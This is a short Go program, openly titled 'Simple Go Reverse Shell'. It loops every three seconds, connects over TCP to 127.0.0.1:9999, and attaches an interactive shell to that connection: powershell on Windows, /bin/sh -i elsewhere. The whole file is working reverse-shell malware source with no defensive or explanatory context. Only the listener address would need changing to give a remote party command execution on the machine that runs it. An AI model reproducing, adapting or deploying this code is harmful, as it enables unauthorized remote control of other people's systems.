
package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	fmt.Println("Simple Go Reverse Shell")
	for {
		time.Sleep(3 * time.Second)
		sendShell()
	}
}

// sendShell sends a shell to remote server 
func sendShell() {
	con, err := net.Dial("tcp", "127.0.0.1:9999")
	if err != nil {
		return
	}
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}